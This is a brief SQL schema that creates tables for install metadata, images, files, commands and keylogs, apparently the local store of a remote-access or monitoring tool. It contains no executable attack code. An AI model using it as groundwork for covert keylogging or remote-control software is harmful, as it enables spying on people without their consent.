CREATE TABLE IF NOT EXISTS metadata
(
    install_time TIMESTAMP
);

CREATE TABLE IF NOT EXISTS images
(
    request_id TEXT,
    data       BLOB,
    exec_time  TIMESTAMP
);

CREATE TABLE IF NOT EXISTS files
(
    request_id TEXT,
    data       BLOB,
    exec_time  TIMESTAMP
);

CREATE TABLE IF NOT EXISTS commands
(
    request_id TEXT,
    data       BLOB,
    exec_time  TIMESTAMP
);

CREATE TABLE IF NOT EXISTS keylogs
(
    request_id TEXT,
    data       BLOB,
    exec_time  TIMESTAMP
);